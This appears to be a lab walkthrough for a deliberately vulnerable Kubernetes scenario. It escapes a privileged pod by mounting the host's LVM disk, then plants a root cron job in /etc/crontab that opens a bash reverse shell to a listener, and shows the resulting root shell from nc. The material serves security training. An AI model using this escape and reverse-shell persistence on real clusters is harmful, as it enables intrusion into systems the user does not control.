# Privileged Pod

This scenario simulates a pod that was configured as privileged. You can connect to this pod using SSH:

```bash
ssh pwned@10.10.20.2 -p 30025 # Password: pwned
```

Privileged containers have a lot of control over the host they run on. Practically, privileged containers can do almost every action that can be performed directly on the host so scaping to the Kubernetes worker is possible. In order to abuse this, root access to the pod container is needed so the SSH pod provided allows the pwned user to use `sudo`.

How you know that that a container is privileged? Well you could use `amicontained` to see that you have all the capabilities. Also, since the container has access to all the devices attached to the host system you would see a lot of devices under the `/dev` directory instead of just a couple of them:

```bash
wget https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -O amicontained
chmod u+x amicontained
./amicontained
```

As said in another scenarios, you can continue reading for a guided exploitation or research for yourself!

## Escape time!

Now you know how dangerous these kind of containers are let's escape from our SSH pod. The approach in this case is to target the host filesystem, remember we have access to all the host's attached devices, disks included!

> [!NOTE]
> By default, seccomp feature is disabled for Kubernetes clusters but hardening guides usually include its activation to limit the system calls a container can use. In this scenario, seccomp is disabled but you may find environments where exploiting privileged containers is not as easy because of this security measure.

A simple `df` command should be enouth to identify our target:
```
ssh-pod-7954b5fbd4-b2hxl:/# df -h
Filesystem                         Size  Used Avail Use% Mounted on
overlay                             62G  7.0G   52G  12% /
tmpfs                               64M     0   64M   0% /dev
shm                                 64M     0   64M   0% /dev/shm
tmpfs                              190M  2.1M  188M   2% /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv   62G  7.0G   52G  12% /etc/hosts
tmpfs                              1.4G   12K  1.4G   1% /run/secrets/kubernetes.io/serviceaccount
```

The interesting one is `/dev/mapper/ubuntu--vg-ubuntu--lv`, that is where the underneth worker node filesystem is. 

Hyper-V uses LVM and that is why it has that weird name. Normally, the device is something like `/dev/sda1` and you can just mount it wherever you want but in this case, since it is a LVM volume, we only have information about the symolic link name that points to the real block file. Look for `/dev/dm-*` files, these represent LVM logical volumes, in this scenario only one will exists so just mount it:

```bash
sudo mkdir /mnt/host_node
sudo mount /dev/dm-0 /mnt/host_node
```

Now you have full access to the node filesystem! From here there are plenty of options to get RCE into the node, in this case a reverse shell will be executed every minute configuring a cron job in `/etc/crontab`:

```
* * * * * root bash -c "bash -i >& /dev/tcp/192.168.*.*/8000 0>&1"
```

Preparing a listener is enough to get a shell to the pod worker node as root:

```
anthares101@WSL:~$ nc -lnvp 8000

Listening on 0.0.0.0 8000
Connection received on 192.168.*.* 56776
bash: cannot set terminal process group (12229): Inappropriate ioctl for device
bash: no job control in this shell
root@aramis:~#
```

## References

- https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
- https://www.cncf.io/blog/2020/10/16/hack-my-mis-configured-kubernetes-privileged-pods/
